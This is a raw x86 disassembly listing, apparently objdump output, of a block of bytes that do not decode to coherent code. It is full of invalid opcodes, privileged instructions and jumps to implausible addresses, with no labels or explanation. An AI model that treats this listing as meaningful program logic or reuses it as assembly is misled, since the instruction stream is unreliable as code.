  4072e4:	lea    ebp,[ecx-0x65]
  4072e7:	sbb    ah,ah
  4072e9:	or     bl,BYTE PTR [ecx]
  4072eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ec:	dec    ecx
  4072ed:	ins    DWORD PTR es:[edi],dx
  4072ee:	aad    0xb
  4072f0:	ins    BYTE PTR es:[edi],dx
  4072f1:	lods   eax,DWORD PTR ds:[esi]
  4072f2:	xor    eax,0xfc918230
  4072f7:	inc    ebp
  4072f8:	push   0x26
  4072fa:	add    ebx,DWORD PTR [eax+eiz*8-0x487cf060]
  407301:	setnp  BYTE PTR [ebp-0x736c9acd]
  407308:	aas    
  407309:	dec    DWORD PTR [ebx]
  40730b:	add    al,BYTE PTR fs:[ebp-0x1b0d17b1]
  407312:	jae    0x407361
  407314:	out    dx,eax
  407315:	ret    0x82a7
  407318:	adc    DWORD PTR [esi],ecx
  40731a:	or     ch,dl
  40731c:	mov    gs,ebp
  40731e:	icebp  
  40731f:	jbe    0x4072f1
  407321:	sub    ebx,esi
  407323:	ds jge 0x4073a2
  407326:	cmp    eax,esi
  407328:	mov    esi,0x272eb8bb
  40732d:	add    ch,dl
  40732f:	iret   
  407330:	mov    ds:0x1d557f62,eax
  407335:	cli    
  407336:	iret   
  407337:	adc    DWORD PTR [bx+0x53f2],ecx
  40733c:	pop    ecx
  40733d:	ficom  WORD PTR [ecx-0x22]
  407340:	ficom  WORD PTR ds:0x8b00662d
  407346:	dec    ebp
  407347:	and    BYTE PTR [ecx-0xd68d24],dl
  40734d:	dec    eax
  40734e:	sub    ah,BYTE PTR [edi-0x6d]
  407351:	xchg   al,ah
  407353:	mov    BYTE PTR [ecx+0x6b],bh
  407356:	call   0x5ec0c534
  40735b:	popf   
  40735c:	dec    ebp
  40735d:	stos   BYTE PTR es:[edi],al
  40735e:	xor    bh,cl
  407360:	fadd   st(1),st
  407362:	(bad)  
  407364:	adc    ebp,DWORD PTR [ecx+esi*4+0x52]
  407368:	mov    ?,WORD PTR [edx+0x7c5a708d]
  40736e:	push   ds
  40736f:	mov    edi,0xbe4504b5
  407374:	adc    BYTE PTR [eax+edi*8+0x0],dh
  407378:	dec    eax
  407379:	sti    
  40737a:	add    eax,0x285d96c0
  40737f:	mov    eax,ds:0xccdbd214
  407384:	(bad)  
  407385:	pop    ebp
  407386:	xchg   ecx,eax
  407387:	int    0x86
  407389:	loop   0x4073a3
  40738b:	inc    eax
  40738c:	mov    WORD PTR [eax-0x10],ds
  40738f:	stos   DWORD PTR es:[edi],eax
  407390:	fcomp  QWORD PTR [eax-0x55]
  407393:	sbb    edx,esp
  407395:	sub    BYTE PTR [edx-0x7b84fa1f],ch
  40739b:	add    eax,0x569d13de
  4073a0:	jae    0x407412
  4073a2:	(bad)  
  4073a3:	sbb    eax,0x8e8ff172
  4073a8:	sbb    ebp,DWORD PTR [ecx+0x51]
  4073ab:	out    0xf,al
  4073ad:	stos   DWORD PTR es:[edi],eax
  4073ae:	loop   0x40735d
  4073b0:	das    
  4073b1:	dec    ecx
  4073b2:	retf   0x2cbe
  4073b5:	adc    BYTE PTR [edi-0x15],dl
  4073b8:	jle    0x4073f3
  4073ba:	loop   0x407411
  4073bc:	test   ebx,esp
  4073be:	int3   
  4073bf:	jbe    0x4073d9
  4073c1:	arpl   WORD PTR [ebp-0x746cf155],bx
  4073c7:	in     al,dx
  4073c8:	icebp  
  4073c9:	sahf   
  4073ca:	mov    fs,WORD PTR [ebx+edi*2]
  4073cd:	mov    esp,ebx
  4073cf:	pop    es
  4073d0:	xor    al,0xc4
  4073d2:	fstp   QWORD PTR [ecx]
  4073d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d5:	xchg   esi,eax
  4073d6:	sbb    BYTE PTR [ebp+0x5de444f8],0xd7
  4073dd:	into   
  4073de:	in     al,0xb8
  4073e0:	imul   ecx,ecx,0xffffffc2
  4073e3:	pushw  ds
  4073e5:	inc    ebp
  4073e6:	jp     0x407452
  4073e8:	xchg   BYTE PTR [ebx+0x272bf3d4],bl
  4073ee:	daa    
  4073ef:	dec    edi
  4073f0:	push   ebx
  4073f1:	push   cs
  4073f2:	lds    edi,FWORD PTR [edx-0x76]
  4073f5:	mov    BYTE PTR [ebp+0x53af5755],al
  4073fb:	mov    WORD PTR ds:0xc72cad0f,?
  407401:	and    eax,0x9f5aa79a
  407406:	push   esp
  407407:	rcr    BYTE PTR [ebx],1
  407409:	inc    edi
  40740a:	cmp    BYTE PTR [ecx],0x26
  40740d:	xor    DWORD PTR [eax],ebx
  40740f:	call   0x5073c927
  407414:	test   al,0x5f
  407416:	dec    eax
  407417:	sbb    eax,0xe9e309c0
  40741c:	xor    esp,DWORD PTR [ebx-0x7b54d056]
  407422:	pop    edx
  407423:	enter  0xb8f1,0x6e
  407427:	jne    0x407483
  407429:	adc    ebp,DWORD PTR [ebx+0x10]
  40742c:	push   ss
  40742d:	stos   DWORD PTR es:[edi],eax
  40742e:	cdq    
  40742f:	jp     0x4073b5
  407431:	xchg   esi,eax
  407432:	adc    al,BYTE PTR [edi]
  407434:	cmp    al,0x0
  407436:	fbstp  TBYTE PTR [ebx]
  407438:	call   0x83d3:0xa5653ec5
  40743f:	mov    ebx,DWORD PTR [eax+edi*2-0x5edccc99]
  407446:	sti    
  407447:	imul   esp
  407449:	int3   
  40744a:	inc    esi
  40744b:	fnstsw WORD PTR [edx]
  40744d:	pop    esp
  40744e:	xchg   BYTE PTR [ebx-0x2db56faf],al
  407454:	loope  0x407415
  407456:	adc    DWORD PTR [esi+0x6bdaeda9],eax
  40745c:	clc    
  40745d:	cmp    al,0xc0
  40745f:	sub    ah,0xd0
  407462:	inc    esi
  407463:	shr    BYTE PTR [edi-0x30],1
  407466:	ja     0x407488
  407468:	push   ss
  407469:	or     edx,esp
  40746b:	push   eax
  40746c:	rol    BYTE PTR [ebx],1
  40746e:	xchg   edx,eax
  40746f:	daa    
  407470:	dec    eax
  407471:	lods   al,BYTE PTR ds:[esi]
  407472:	adc    al,ch
  407474:	inc    ecx
  407475:	mov    eax,0xe668760
  40747a:	inc    DWORD PTR [ebp+0x22]
  40747d:	sbb    dh,BYTE PTR [esi+0x60]
  407480:	mov    edx,0xf2420c95
  407485:	jbe    0x407466
  407487:	push   cs
  407488:	and    al,0x8
  40748a:	mov    dl,0xb5
  40748c:	sub    ch,BYTE PTR [edi+esi*2-0x59d584c9]
  407493:	xchg   edi,eax
  407494:	push   esi
  407495:	xor    BYTE PTR [edx-0x4e],bl
  407498:	xchg   ecx,eax
  407499:	mov    BYTE PTR [eax+0x44],bl
  40749c:	dec    ebp
  40749d:	adc    eax,0x2fc4cac4
  4074a2:	xchg   DWORD PTR [ebx+0x3d],ebx
  4074a5:	lea    edx,[edx-0x1e8c616d]
  4074ab:	jge    0x407449
  4074ad:	push   esp
  4074ae:	jb     0x4074f5
  4074b0:	iret   
  4074b1:	mov    bh,0x24
  4074b3:	adc    eax,0x63e5522a
  4074b8:	adc    eax,DWORD PTR [edx-0x4ce09eeb]
  4074be:	push   ds
  4074bf:	ret    0x9954
  4074c2:	pop    ecx
  4074c3:	xchg   esi,eax
  4074c4:	cmp    esi,DWORD PTR [ecx+esi*1]
  4074c7:	cdq    
  4074c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074c9:	lds    esp,FWORD PTR [esi-0x71616979]
  4074cf:	sub    al,0x6
  4074d1:	adc    esp,DWORD PTR [edi]
  4074d3:	pop    edx
  4074d4:	mov    edx,0x146f35cc
  4074d9:	dec    ebx
  4074da:	xchg   ebp,eax
  4074db:	test   al,0x6
  4074dd:	imul   esi,DWORD PTR [edx+0x3a574886],0x3c
  4074e4:	inc    edx
  4074e5:	add    al,0xd0
  4074e7:	repz pop es
  4074e9:	jp     0x4074ab
  4074eb:	xchg   ebx,eax
  4074ec:	jmp    0x407492
  4074ee:	mov    bh,BYTE PTR [ecx+ebp*8-0x2f]
  4074f2:	fnstenv [edi]
  4074f4:	inc    esi
  4074f6:	sub    esi,esp
  4074f8:	xor    BYTE PTR [edi],ah
  4074fa:	mov    BYTE PTR [edx],cl
  4074fc:	ret    0xee14
  4074ff:	call   0xe1a:0x7997dbdf
  407506:	sbb    al,BYTE PTR [esp+esi*4-0x1f]
  40750a:	push   edx
  40750b:	arpl   WORD PTR [esi+0x5deaf598],ax
  407511:	sbb    eax,0x47a32533
  407516:	dec    BYTE PTR ds:0x594c9fd5
  40751c:	push   eax
  40751d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40751e:	icebp  
  40751f:	xor    esi,DWORD PTR [ebx]
  407521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407522:	cld    
  407523:	ins    DWORD PTR es:[edi],dx
  407524:	hlt    
  407525:	loope  0x4074dd
  407527:	add    DWORD PTR [edi-0xb],ebx
  40752a:	jae    0x4075a7
  40752c:	mov    edi,0xd44cc894
  407531:	in     eax,0x37
  407533:	dec    edi
  407534:	sbb    al,0x60
  407536:	push   esp
  407537:	mov    esp,0xe97d0d1e
  40753c:	and    eax,0xf409bc84
  407541:	std    
  407542:	dec    esp
  407543:	lahf   
  407544:	inc    ebp
  407545:	in     al,dx
  407546:	inc    edx
  407547:	dec    edx
  407548:	mov    al,0x81
  40754a:	or     al,0x78
  40754c:	mov    eax,0x9b2b9a69
  407551:	fstp   st(6)
  407553:	cmp    eax,0xa8cc58fe
  407558:	xchg   edx,eax
  407559:	(bad)  
  40755b:	mov    ah,0xf2
  40755d:	xchg   esi,eax
  40755e:	fist   DWORD PTR [ebx+0x7107a75d]
  407564:	mov    bl,0x4b
  407566:	or     DWORD PTR [edx+0x48],0x11
  40756a:	loop   0x4075c8
  40756c:	jne    0x4075ae
  40756e:	out    dx,al
  40756f:	sub    al,0x31
  407571:	je     0x407508
  407573:	stc    
  407574:	in     eax,dx
  407575:	ds mov eax,0x2c2a344c
  40757b:	shr    BYTE PTR [ebx-0x8],cl
  40757e:	(bad)  
  407580:	(bad)  
  407581:	cli    
  407582:	pop    ebp
  407583:	fldcw  WORD PTR [esi+0x210393e7]
  407589:	push   ebx
  40758a:	enter  0x36f2,0x84
  40758e:	call   0x4210934d
  407593:	mov    ch,0xb4
  407595:	mov    bh,BYTE PTR cs:[ebx]
  407598:	rcr    DWORD PTR [eax-0x4b],cl
  40759b:	xchg   esi,eax
  40759c:	mov    esp,0x25983905
  4075a1:	fwait
  4075a2:	scas   eax,DWORD PTR es:[edi]
  4075a3:	sub    esp,ebp
  4075a5:	fmul   DWORD PTR [esp+ebp*4]
  4075a8:	hlt    
  4075a9:	call   0xf372:0x1e51bf7f
  4075b0:	(bad)  [ecx+0x26]
  4075b3:	and    eax,DWORD PTR [eax-0x10dc32fb]
  4075b9:	retf   0x9521
  4075bc:	fwait
  4075bd:	jecxz  0x40755d
  4075bf:	xchg   ebx,eax
  4075c0:	mov    bh,0x67
  4075c2:	aaa    
  4075c3:	cli    
  4075c4:	mov    DWORD PTR [ebx-0x7a],ebp
  4075c7:	sub    eax,0xf22be81a
  4075cc:	xlat   BYTE PTR ds:[ebx]
  4075cd:	adc    eax,0xf9792720
  4075d2:	xchg   ebp,eax
  4075d3:	pop    ebx
  4075d4:	sub    edx,DWORD PTR [eax-0x1]
  4075d7:	and    dl,BYTE PTR [edx+0x387e0ae9]
  4075dd:	push   0x63cf93c5
  4075e2:	mov    DWORD PTR [eax-0x14d50933],edi
  4075e8:	mov    eax,ds:0x94e73135
  4075ed:	dec    eax
  4075ee:	adc    eax,0x1bb769af
  4075f3:	adc    al,0x8e
  4075f5:	or     eax,0x90f316ec
  4075fa:	(bad)  
  4075fb:	push   edi
  4075fc:	mov    ebp,0x213b9ea
  407601:	bound  ecx,QWORD PTR [ebx]
  407603:	cmc    
  407604:	(bad)  
  407605:	dec    esp
  407606:	cs jnp 0x40761e
  407609:	pop    ds
  40760a:	imul   edx,DWORD PTR [edi+0x22307b88],0xb4e6547c
  407614:	jns    0x407669
  407616:	ds sub cl,dl
  407619:	or     cl,BYTE PTR [ecx+0x7]
  40761c:	adc    bh,BYTE PTR [edx-0x3c]
  40761f:	cmp    ebp,DWORD PTR [eax-0x4]
  407622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407624:	xor    BYTE PTR [ebx-0x67],al
  407627:	sbb    eax,0x228cfbea
  40762c:	push   edx
  40762d:	xor    DWORD PTR [esi],0xffffffdd
  407630:	inc    ebp
  407631:	push   esi
  407632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407633:	pop    edi
  407634:	mov    edx,esp
  407636:	add    al,al
  407638:	mov    ebx,0x5f55c8eb
  40763d:	mov    cs,WORD PTR [ebx-0x6d]
  407640:	out    0xb4,al
  407642:	jbe    0x40765f
  407644:	dec    ecx
  407645:	mov    cl,0xe9
  407647:	jnp    0x4075d7
  407649:	dec    edi
  40764a:	mov    bh,0xb5
  40764c:	dec    esi
  40764d:	dec    eax
  40764e:	push   esi
  40764f:	or     ecx,ecx
  407651:	sbb    BYTE PTR [ecx],dh
  407653:	out    0xe,eax
  407655:	or     eax,0xf2fd9220
  40765a:	and    al,0xf2
  40765c:	and    BYTE PTR [eax-0x38],0x86
  407660:	fst    DWORD PTR [ecx+0x194b1d9]
  407666:	or     DWORD PTR [eax-0x6fed02e1],edi
  40766c:	(bad)  
  40766d:	add    dh,BYTE PTR [ecx]
  40766f:	dec    esp
  407670:	inc    ecx
  407671:	push   0xb1b0a4f9
  407676:	stc    
  407677:	fwait
  407678:	jne    0x4076c5
  40767a:	cli    
  40767b:	and    DWORD PTR [edi+0x54882510],esi
  407681:	adc    dh,ch
  407683:	push   0xebba8623
  407688:	mov    eax,ds:0xa97e6375
  40768d:	jl     0x4076ac
  40768f:	xchg   ebp,eax
  407690:	popf   
  407691:	mov    ah,0x5a
  407693:	or     edx,DWORD PTR [eax]
  407695:	xor    BYTE PTR [ebx+0x7c],dh
  407698:	shl    bh,cl
  40769a:	xor    esp,ebp
  40769c:	retf   0x4078
  40769f:	aam    0x95
  4076a1:	iret   
  4076a2:	sbb    eax,0xa79a0fb9
  4076a7:	or     al,0xbf
  4076a9:	xchg   esi,eax
  4076aa:	aas    
  4076ab:	scas   eax,DWORD PTR es:[edi]
  4076ac:	pop    ecx
  4076ad:	mov    dh,0xd0
  4076af:	ja     0x4076e0
  4076b1:	mov    edx,0x9a2241d
  4076b6:	and    al,0xcb
  4076b8:	icebp  
  4076b9:	ja     0x4076f2
  4076bb:	xor    DWORD PTR [edi+0x25],ebx
  4076be:	mov    eax,ds:0xede1f93a
  4076c3:	ds retf 0x1fd2
  4076c7:	cs mov edx,0x826aa41a
  4076cd:	jge    0x40771c
  4076cf:	jle    0x4076be
  4076d1:	aas    
  4076d2:	mov    ch,0x9e
  4076d4:	add    eax,DWORD PTR [edx+0x23]
  4076d7:	or     esp,DWORD PTR [eax+0x14]
  4076da:	jbe    0x40773a
  4076dc:	(bad)  
  4076dd:	hlt    
  4076de:	shl    BYTE PTR [edi+ecx*1-0x7179182a],cl
  4076e5:	xchg   edi,eax
  4076e6:	popa   
  4076e7:	mov    BYTE PTR [edi+0x4882e0d7],bl
  4076ed:	fld    TBYTE PTR [eax]
  4076ef:	sub    bl,BYTE PTR ds:0x721ac3db
  4076f5:	dec    ebp
  4076f6:	sbb    edi,DWORD PTR [eax+0x53]
  4076f9:	sub    ch,BYTE PTR [edx]
  4076fb:	jns    0x4076cd
  4076fd:	adc    DWORD PTR [edx],esp
  4076ff:	add    BYTE PTR gs:[ebx],0x70
  407703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407704:	pop    ebp
  407705:	inc    ebp
  407706:	adc    bl,BYTE PTR [eax-0x44fe9010]
  40770c:	xchg   esi,eax
  40770d:	pop    eax
  40770e:	sti    
  40770f:	enter  0x3bcf,0xe
  407713:	jo     0x4076d4
  407715:	sub    dl,dh
  407717:	out    dx,al
  407718:	fidiv  DWORD PTR [edi]
  40771a:	stos   BYTE PTR es:[edi],al
  40771b:	cmp    al,BYTE PTR [esi-0x5b5b329b]
  407721:	in     eax,0x3e
  407723:	dec    eax
  407724:	sti    
  407725:	add    BYTE PTR [edi-0x282218fb],ch
  40772b:	mov    ebp,0xadeba6bd
  407730:	mov    fs,WORD PTR [eax+0x20c5de33]
  407736:	mov    ah,bh
  407738:	mov    eax,ds:0x60387054
  40773d:	jno    0x407779
  40773f:	sub    al,BYTE PTR [esi+edx*8+0x76]
  407743:	fsubr  QWORD PTR [esi+0x12]
  407746:	arpl   WORD PTR [ebx+0x7a7b5fc4],si
  40774c:	push   esp
  40774d:	mov    edx,0x60455080
  407752:	inc    ebp
  407753:	dec    ebx
  407754:	mov    ds:0xd5174c6c,al
  407759:	fwait
  40775a:	push   edx
  40775b:	xor    al,0xe5
  40775d:	mov    WORD PTR ds:0x62ba32dd,ds
  407763:	enter  0x58d3,0xc7
  407767:	mov    al,ds:0xacbd81d
  40776c:	out    0xe9,eax
  40776e:	mov    al,0x5c
  407770:	xlat   BYTE PTR ds:[ebx]
  407771:	xchg   esi,eax
  407772:	and    ecx,DWORD PTR [eax]
  407774:	fcmovu st,st(6)
  407776:	xchg   BYTE PTR [ecx],cl
  407778:	add    DWORD PTR [edi+esi*8],esi
  40777b:	sub    bl,BYTE PTR [edx]
  40777d:	xor    DWORD PTR [eax+0x12436235],esi
  407783:	mov    al,0xad
  407785:	jo     0x4077f6
  407787:	xlat   BYTE PTR ds:[ebx]
  407788:	sbb    al,0x44
  40778a:	imul   eax,DWORD PTR [edx+0x48],0xc16860a5
  407791:	sbb    eax,esp
  407793:	int3   
  407794:	pop    ebx
  407795:	das    
  407796:	sub    bh,BYTE PTR [esi-0x3]
  407799:	aam    0x87
  40779b:	dec    edi
  40779c:	imul   BYTE PTR [ebx]
  40779e:	or     al,0x9a
  4077a1:	pop    esp
  4077a2:	call   0x40b9622b
  4077a7:	and    BYTE PTR [ebx-0xdda8dd4],dh
  4077ad:	ja     0x40778a
  4077af:	dec    ecx
  4077b0:	es pop esi
  4077b2:	jne    0x40773e
  4077b4:	jmp    0x407754
  4077b6:	aad    0x1c
  4077b8:	retf   0xca32
  4077bb:	jmp    0xc68a:0x43410d71
  4077c2:	mov    dh,BYTE PTR [esi+ecx*2+0x3]
  4077c6:	scas   al,BYTE PTR es:[edi]
  4077c7:	xchg   ebp,eax
  4077c8:	pop    ecx
  4077c9:	inc    ebx
  4077ca:	ja     0x40776b
  4077cc:	sar    ebx,cl
  4077ce:	(bad)  
  4077cf:	inc    BYTE PTR [ebp-0x32]
  4077d2:	popa   
  4077d3:	fsubr  DWORD PTR [ebx-0x7a]
  4077d6:	xchg   edx,eax
  4077d7:	jae    0x40779b
  4077d9:	add    BYTE PTR [edx+0x525ed1],dh
  4077df:	fsubr  st(5),st
  4077e1:	inc    ebx
  4077e2:	je     0x4077df
  4077e4:	jle    0x40783f
  4077e6:	pop    esp
  4077e7:	(bad)  
  4077e8:	xor    edx,DWORD PTR [ebp-0x6c4a75d6]
  4077ee:	cmp    ah,BYTE PTR [edi-0x3c]
  4077f1:	jmp    0xb154:0x2df1552e
  4077f8:	js     0x407852
  4077fa:	mov    edi,0x92214a29
  4077ff:	ret    0xd534
  407802:	sbb    ecx,ecx
  407804:	cmp    DWORD PTR [ecx+0x53f2a1d6],edx
  40780a:	push   ecx
  40780b:	mov    ds:0xb6e8006,al
  407810:	xchg   esi,eax
  407811:	test   eax,0x88be261c
  407816:	sar    BYTE PTR [ecx+0x7fb8fa42],1
  40781c:	js     0x4077c7
  40781e:	div    DWORD PTR [esi-0x25]
  407821:	inc    esp
  407822:	fidiv  WORD PTR [esp+esi*4-0x27]
  407826:	test   BYTE PTR [ebp-0x20d3d509],bl
  40782c:	imul   edi,DWORD PTR [edi+0x402aefcf],0x8360450b
  407836:	daa    
  407837:	es dec ebp
  407839:	icebp  
  40783a:	aaa    
  40783b:	and    BYTE PTR [ebp+ebp*2-0x20],ch
  40783f:	xchg   DWORD PTR [ebx],ecx
  407841:	dec    ecx
  407842:	sbb    eax,0x6ccaf97a
  407847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407848:	rcr    BYTE PTR [eax],cl
  40784a:	push   cs
  40784b:	dec    esi
  40784c:	inc    edx
  40784d:	daa    
  40784e:	das    
  40784f:	ja     0x407835
  407851:	add    al,0x9c
  407853:	push   es
  407854:	aad    0x19
  407856:	cmp    DWORD PTR cs:[edx],esi
  407859:	nop
  40785a:	xor    esp,DWORD PTR [eax+ebp*2]
  40785d:	add    ebp,DWORD PTR [edx]
  40785f:	adc    eax,0x2a834772
  407864:	jmp    0x9eaa78
  407869:	sbb    esp,DWORD PTR [esp+esi*2]
  40786c:	push   edi
  40786d:	(bad)  
  40786e:	call   0xa87c:0x1b3ea671
  407875:	mov    dh,BYTE PTR [edx-0x2d]
  407878:	pop    eax
  407879:	add    BYTE PTR [ebx+ebx*1+0x6f],0x78
  40787e:	mov    eax,0x5994e7b2
  407883:	adc    bl,BYTE PTR [edx]
  407885:	and    eax,0x14615f9
  40788a:	fmul   QWORD PTR [eax+0x7786f195]
  407890:	mov    ch,0xd2
  407892:	jmp    0xbcf0:0xf366629f
  407899:	nop
  40789a:	enter  0xf0ba,0x56
  40789e:	daa    
  40789f:	int3   
  4078a0:	inc    edi
  4078a1:	or     ah,bl
  4078a3:	xchg   ebx,eax
  4078a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a5:	iret   
  4078a6:	mov    edi,0x8517b61
  4078ab:	neg    BYTE PTR ds:0x2d1011c6
  4078b1:	jg     0x407897
  4078b3:	out    dx,al
  4078b4:	xchg   DWORD PTR [edx],edx
  4078b6:	add    al,0x92
  4078b8:	add    edx,0x71
  4078bb:	jns    0x407930
  4078bd:	sar    bl,1
  4078bf:	push   eax
  4078c0:	fdiv   QWORD PTR [edx+0x43]
  4078c3:	mov    edi,0x22468e24
  4078c8:	call   0x5ef:0xcfaeba35
  4078cf:	in     al,dx
  4078d0:	sub    eax,0x988c9811
  4078d5:	pop    edx
  4078d6:	stos   DWORD PTR es:[edi],eax
  4078d7:	sbb    DWORD PTR [esi-0x33],edx
  4078da:	or     DWORD PTR [ebx],0xe561ceff
  4078e0:	mov    ebp,0xcd989602
  4078e5:	mov    bh,0xb7
  4078e7:	adc    al,0xb4
  4078e9:	(bad)  
  4078ea:	mov    cl,0x52
  4078ec:	fld    QWORD PTR [edi-0x487cc950]
  4078f2:	push   ebp
  4078f3:	enter  0xf740,0xf1
  4078f7:	sub    eax,0x818676ef
  4078fc:	scas   eax,DWORD PTR es:[edi]
  4078fd:	fidiv  DWORD PTR [edi+0x7f]
  407900:	test   al,0x4
  407902:	mov    ?,WORD PTR [ebx-0x568613ae]
  407908:	mov    al,ds:0x5e3f5921
  40790d:	ret    0x7b53
  407910:	push   edx
  407911:	push   edx
  407912:	xor    BYTE PTR [ebx+0x29],0x19
  407916:	mov    DWORD PTR [eax-0x478fb10e],0x6dabb73e
  407920:	ins    BYTE PTR es:[edi],dx
  407921:	loope  0x407954
  407923:	jno    0x4079a1
  407925:	je     0x4078dc
  407927:	es sti 
  407929:	fisttp DWORD PTR [esi+edx*4-0x3690cb5]
  407930:	cdq    
  407931:	xor    edi,DWORD PTR [edx+eax*1-0x3]
  407935:	push   0xffffff82
  407937:	ins    BYTE PTR es:[edi],dx
  407938:	pop    esi
  407939:	loope  0x407964
  40793b:	or     DWORD PTR [eax+ecx*8-0x409f883f],0x24
  407943:	mov    ds:0x2b856b4b,al
  407948:	ret    
  407949:	fbstp  TBYTE PTR [eax]
  40794b:	dec    ebp
  40794c:	pop    esp
  40794d:	addr16 pop eax
  40794f:	rcr    DWORD PTR [eax+0x1434a142],1
  407955:	push   es
  407956:	xchg   esp,eax
  407957:	mov    eax,edx
  407959:	and    ebx,DWORD PTR [edx]
  40795b:	xchg   esi,eax
  40795c:	mov    ebx,0x862bb593
  407961:	mov    ds:0xd17353d6,eax
  407966:	mov    ebp,0xb2c52e71
  40796b:	cs add eax,0x42c70f4b
  407971:	xchg   esi,eax
  407972:	pop    esp
  407973:	pop    ss
  407974:	gs and bh,ch
  407977:	mov    dh,0xbc
  407979:	sbb    cl,BYTE PTR [eax-0x3f7fad53]
  40797f:	cmc    
  407980:	sub    al,0x3
  407982:	push   eax
  407983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407984:	test   DWORD PTR [edi],esi
  407986:	inc    ebp
  407987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407988:	adc    bh,BYTE PTR [ebp+0x157cfc07]
  40798e:	jle    0x407928
  407990:	fwait
  407991:	test   eax,0xa66fb1ea
  407996:	push   ss
  407997:	repz mov al,BYTE PTR [edi+eax*1-0x8]
  40799c:	adc    ecx,DWORD PTR [ebx-0x4ae66230]
  4079a2:	mov    ah,0xf3
  4079a4:	pusha  
  4079a5:	dec    eax
  4079a6:	pushfw 
  4079a8:	xlat   BYTE PTR ds:[ebx]
  4079a9:	push   es
  4079aa:	add    bl,ch
  4079ac:	enter  0x8ebd,0xed
  4079b0:	xlat   BYTE PTR ds:[ebx]
  4079b1:	outs   dx,BYTE PTR ds:[esi]
  4079b2:	or     DWORD PTR [edi+0x40],esp
  4079b5:	retf   
  4079b6:	fs test ch,bh
  4079b9:	jp     0x4079d7
  4079bb:	jnp    0x40797d
  4079bd:	jecxz  0x407964
  4079bf:	cmc    
  4079c0:	mov    bl,0x9f
  4079c2:	mov    ebx,DWORD PTR [edx+eax*1]
  4079c5:	xor    esp,DWORD PTR [edi-0x235b401e]
  4079cb:	sub    DWORD PTR [ebx-0x10],0x8c178bf4
  4079d2:	div    BYTE PTR [esi-0x2f]
  4079d5:	pop    eax
  4079d6:	or     ebp,DWORD PTR [ecx+esi*8+0x34]
  4079da:	and    eax,0x8a7e8db0
  4079df:	xor    DWORD PTR [ebp-0x41],edx
  4079e2:	and    BYTE PTR [eax-0x56],dl
  4079e5:	(bad)  
  4079e6:	and    eax,0xd783d0ba
  4079eb:	outs   dx,DWORD PTR ds:[esi]
  4079ec:	add    ecx,edx
  4079ee:	inc    eax
  4079ef:	and    DWORD PTR [ebx-0x2a1cfd1],0xffffffd1
  4079f6:	jmp    0xbd1f:0x76edfc41
  4079fd:	xor    BYTE PTR [ebp+0x54ea8564],bl
  407a03:	push   ss
  407a04:	jecxz  0x4079c9
  407a06:	dec    ecx
  407a07:	add    bl,BYTE PTR [edx-0x1a]
  407a0a:	ror    DWORD PTR [ebx+0x59a710ef],0x70
  407a11:	mov    esi,0xd58990c2
  407a16:	pop    es
  407a17:	int3   
  407a18:	(bad)  
  407a19:	pop    edi
  407a1a:	sub    BYTE PTR [ebx+0x6f217d49],bh
  407a20:	push   ebp
  407a21:	rcr    edx,0xc6
  407a24:	add    dh,cl
  407a26:	jecxz  0x4079ea
  407a28:	pop    esi
  407a29:	mov    esp,0x28e8895
  407a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a2f:	mov    edi,0x5338c0da
  407a34:	or     edi,DWORD PTR [eax-0x7c634e86]
  407a3a:	pushf  
  407a3b:	sbb    al,0xcf
  407a3d:	add    ebx,DWORD PTR [ebx+0x74]
  407a40:	xchg   BYTE PTR fs:[eax+eax*2],cl
  407a44:	mov    ah,0x74
  407a46:	jg     0x407a6f
  407a48:	arpl   WORD PTR [eax+0x1d7fd910],si
  407a4e:	mov    esi,0x43529617
  407a53:	jne    0x407acd
  407a55:	ins    DWORD PTR es:[edi],dx
  407a56:	mov    al,bh
  407a58:	(bad)  
  407a59:	dec    eax
  407a5a:	ins    DWORD PTR es:[edi],dx
  407a5b:	stc    
  407a5c:	(bad)  
  407a5d:	loopne 0x407a4e
  407a5f:	inc    ecx
  407a60:	and    al,0xcd
  407a62:	out    dx,eax
  407a63:	test   BYTE PTR [ebx],ch
  407a65:	call   0x6fb131aa
  407a6a:	inc    esp
  407a6b:	and    dl,ah
  407a6d:	sbb    BYTE PTR ds:0xa6170bec,al
  407a73:	push   eax
  407a74:	mov    dl,0xc7
  407a76:	jecxz  0x407a8f
  407a78:	cmp    ebx,DWORD PTR [ebx-0x6714828b]
  407a7e:	cli    
  407a7f:	ror    DWORD PTR [edi-0x5ad29f8c],1
  407a85:	add    BYTE PTR [edi+0x74bdc5ef],0xff
  407a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a8d:	call   0xa8af76b5
  407a92:	rol    al,1
  407a94:	(bad)  
  407a95:	shr    DWORD PTR [ecx],1
  407a97:	pop    ss
  407a98:	ja     0x407acd
  407a9a:	mov    dl,dl
  407a9c:	xchg   ebp,eax
  407a9d:	adc    BYTE PTR [eax-0x549f9597],dl
  407aa3:	lea    edx,[ebx]
  407aa5:	pop    ecx
  407aa6:	dec    esp
  407aa7:	cdq    
  407aa8:	ss scas al,BYTE PTR es:[edi]
  407aaa:	push   ecx
  407aab:	aas    
  407aac:	add    al,0x73
  407aae:	mov    eax,0xeb34961a
  407ab3:	and    al,0x9a
  407ab5:	rcr    esp,0xf6
  407ab8:	jle    0x407a3b
  407aba:	sbb    al,ah
  407abc:	sti    
  407abd:	push   cs
  407abe:	jne    0x407a69
  407ac0:	mov    eax,ds:0x177d0902
  407ac5:	jns    0x407a7b
  407ac7:	adc    BYTE PTR [ebx],bl
  407ac9:	add    eax,0xc7e7b1e
  407ace:	adc    eax,esi
  407ad0:	clc    
  407ad1:	xchg   ecx,eax
  407ad2:	test   eax,0xf62c5d5a
  407ad7:	push   es
  407ad8:	cmp    ch,ah
  407ada:	repz bound edi,QWORD PTR [ecx]
